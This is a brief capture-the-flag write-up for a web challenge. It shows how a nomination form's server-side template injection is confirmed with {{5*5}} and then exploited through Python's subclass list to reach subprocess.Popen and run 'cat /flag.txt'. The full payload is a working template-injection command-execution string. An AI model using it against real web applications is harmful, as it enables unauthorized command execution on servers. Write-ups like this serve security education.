## Solution
We get a webapp where we can nominate `Cyber Heroines`. Putting in name and a biography we are forwarded to a page that display our input. Checking for `SSTI` we can input eg `{{5*5}}` to one of the fields and: `Nomination received for: asd with bio:25` vulnerable.

From here we only need to find a fitting workload starting with `{{''.__class__.mro()[1].__subclasses__()}}` we get a list of available classes to pick. We find `subprocess.Popen` at position `352`. So we can go futher and call system commands.

```
{{''.__class__.mro()[1].__subclasses__()[352]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

Gives us the flag.
